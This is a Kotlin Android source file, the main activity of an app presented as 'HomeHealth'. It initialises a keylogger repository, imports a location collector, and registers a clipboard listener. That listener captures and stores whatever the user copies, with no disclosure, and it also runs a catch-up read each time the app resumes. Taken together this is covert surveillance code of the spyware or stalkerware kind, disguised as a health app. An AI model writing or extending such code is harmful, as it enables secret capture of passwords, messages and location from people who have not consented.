package com.example.homehealth

import android.Manifest
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.rememberNavController
import com.example.homehealth.data.repository.LogRepository
import com.example.homehealth.ui.theme.HomeHealthTheme
import com.example.homehealth.utils.ClipboardMonitor
import com.example.homehealth.utils.createNotificationChannels
import com.example.homehealth.location.LocationCollector
import com.example.homehealth.keylogger.KeylogRepository
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val notificationGranted = permissions[Manifest.permission.POST_NOTIFICATIONS] == true

            if (notificationGranted) {
                Log.d("Permission", "Notification permission granted")
            }
        }

    private var lastClipboardLogTime = 0L
    private var lastClipboardText = ""
    private val clipboardDebounceMs = 1000L // Debounce for 1 second

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Initialize keylogger repository
        KeylogRepository.getInstance().init(this)

        createNotificationChannels(this)
        checkAndRequestPermissions()

        // Use the centralized scheduler
        WorkScheduler.schedule(this)

        setContent {
            HomeHealthTheme {
                val navController = rememberNavController()
                NavGraph(navController)
            }
        }
    }

    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            }
        }
    }

    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            }
        }
    }

    private fun checkClipboardAndLog() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clipData = clipboard.primaryClip
        if (clipData != null && clipData.itemCount > 0) {
            val text = clipData.getItemAt(0).text?.toString() ?: ""
            Log.d("Clipboard", "Detected: $text")

            // Update UI state
            ClipboardMonitor.updateText(text)

            // Log if new or enough time passed
            val currentTime = System.currentTimeMillis()
            if (text.isNotBlank() && (text != lastClipboardText || currentTime - lastClipboardLogTime > clipboardDebounceMs)) {
                lastClipboardText = text
                lastClipboardLogTime = currentTime
                lifecycleScope.launch {
                    LogRepository.logClipboardText(this@MainActivity, text)
                }
            }
        }
    }

    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        checkClipboardAndLog()
    }

    // MERGED onResume function
    override fun onResume() {
        super.onResume()

        // 1. Notification logic
        requestNotificationPermission()

        // 2. Clipboard logic - Register listener and perform initial check
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        // Remove listener first to prevent duplicates
        clipboard.removePrimaryClipChangedListener(clipboardListener)
        clipboard.addPrimaryClipChangedListener(clipboardListener)
        
        // CATCH-UP: Check immediately what was copied while app was away
        checkClipboardAndLog()
    }

    override fun onPause() {
        super.onPause()
        // Unregister to save resources when app is in background
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.removePrimaryClipChangedListener(clipboardListener)
    }
}
